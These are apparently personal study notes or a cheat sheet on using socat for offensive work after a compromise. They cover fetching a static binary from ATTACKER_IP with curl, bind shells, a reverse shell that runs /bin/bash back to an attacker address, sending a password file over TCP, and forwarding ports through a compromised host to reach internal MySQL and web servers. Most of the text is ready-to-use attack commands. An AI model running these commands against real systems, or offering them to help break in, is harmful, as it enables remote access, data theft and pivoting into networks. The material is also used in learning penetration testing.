
**Socat** is a powerful tool for connecting two endpoints together. It can be used for **port forwarding, relays, and shells**.

It is usually not installed by default, so you may need to upload a **static binary**.
# Transfer Socat

On attacker:
```bash
sudo python3 -m http.server 80
```

On target:
```bash
curl ATTACKER_IP/socat -o /tmp/socat
chmod +x /tmp/socat
```

---
# Shells & File Transfer

## 1. Bind Shell

The **target listens**, and the attacker connects to it.

**Target:**
```bash
socat TCP4-LISTEN:4444 STDOUT
```

**Attacker:**
```bash
socat STDIN TCP4:10.10.170.77:4444
```

Example:
```text
Target:   10.10.170.77:4444
Attacker: 10.10.170.50
```

```text
Attacker (10.10.170.50)
        │
        │ TCP/4444
        ↓
Target (10.10.170.77)
```

## 2. File Transfer

Socat can transfer a file between two machines.

**Receiver:**
```bash
socat TCP-LISTEN:443,fork FILE:password.txt,create
```

| Part                | Meaning                                           |
| ------------------- | ------------------------------------------------- |
| `TCP-LISTEN:443`    | Listen for TCP connections on port `443`          |
| `fork`              | Create a new process for each incoming connection |
| `FILE:password.txt` | Connect the TCP stream to the file `password.txt` |
| `create`            | Create the file if it doesn't already exist       |

**Sender:**
```bash
socat TCP:192.168.0.194:443 FILE:password.txt
```

Example:
```text
Sender                         Receiver
192.168.0.50                   192.168.0.194
password.txt                   password.txt
     │                               │
     └──────── TCP/443 ──────────────┘
```

The file is sent from the sender and written as `password.txt` on the receiver.

---

## 3. Reverse Shell

The **attacker listens**, while the target connects back and executes Bash.

**Attacker:**
```bash
socat TCP4-LISTEN:443 STDOUT
```

**Target:**
```bash
socat TCP4:10.10.170.50:443 EXEC:/bin/bash
```

Example:
```text
Attacker
10.10.170.50:443
      ↑
      │ connection
      │
Target
10.10.170.77
      │
      └── /bin/bash
```

The target initiates the connection:
```text
Target ──────── TCP/443 ────────> Attacker
  │                                  │
  └── /bin/bash                       └── receives shell
```


---
# Socat Port Forwarding

Socat can forward traffic from one port to another, allowing access to services that are only reachable from a compromised host.
## Direct Port Forwarding

Open a port on the ==compromised host== and forward connections to an internal service.
### Syntax
```bash
socat tcp-l:<LISTEN_PORT>,fork,reuseaddr tcp:<TARGET_IP>:<TARGET_PORT>
```

### Example
```bash
socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
```

Breakdown:
```text
tcp-l:33060       → Listen on TCP port 33060
fork              → Handle each connection separately
reuseaddr         → Allow the listener to reuse the address/port
tcp:172.16.0.10:3306 → Forward traffic to the internal MySQL server
&                 → Run Socat in the background
```

Traffic:
```text
Attacker
   │
   │ 33060
   ↓
Compromised Host
172.16.0.5:33060
   │
   │ 3306
   ↓
Internal MySQL
172.16.0.10:3306
```

Connect from the attacker:
```bash
mysql -h 172.16.0.5 -P 33060 -u USERNAME -p
```

The attacker connects to `172.16.0.5:33060`, and Socat forwards the connection to `172.16.0.10:3306`.

---

## Quiet Port Forwarding

The direct method requires the compromised host to expose a listening port.

Instead, the compromised host can **connect back to the attacker**, creating a forwarding chain without opening a new externally accessible listener on the compromised host.
### Attacker
```bash
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

The attacker creates two listeners:
```text
127.0.0.1:8000  → Local service
ATTACKER_IP:8001 → Connection from compromised host
```
### Compromised Host
```bash
socat tcp:ATTACKER_IP:8001 tcp:TARGET_IP:80,fork &
```

Example:
```bash
socat tcp:10.10.10.5:8001 tcp:172.16.0.10:80,fork &
```

Traffic:

```text
Browser
127.0.0.1:8000
      ↓
Attacker:8001
      ↓
Compromised Host
      ↓
Internal Web Server
172.16.0.10:80
```

Now access the internal web server locally:
```text
http://127.0.0.1:8000
```

### Why use this method?
- The compromised host does not need a new externally accessible listening port.
- The connection is initiated **from the compromised host to the attacker**.
- Useful when inbound connections to the compromised host are restricted.
- More complex because you need listeners on the attacker and a connection-back from the compromised host.
## Quick Comparison
```text
Direct:
Attacker → Compromised:33060 → Internal:3306

Quiet:
Attacker:8000 → Attacker:8001
                    ↑
                    │
              Compromised
                    │
                    ↓
              Internal:80
```

**Memory:**
> Direct = compromised host **listens** and forwards.  
> Quiet = compromised host **connects back** to the attacker, which then forwards the traffic.

---
# Cleanup

List background jobs:
```bash
jobs
```

Kill the Socat job:
```bash
kill %NUMBER
```

Or find the process:
```bash
ps aux | grep socat
```

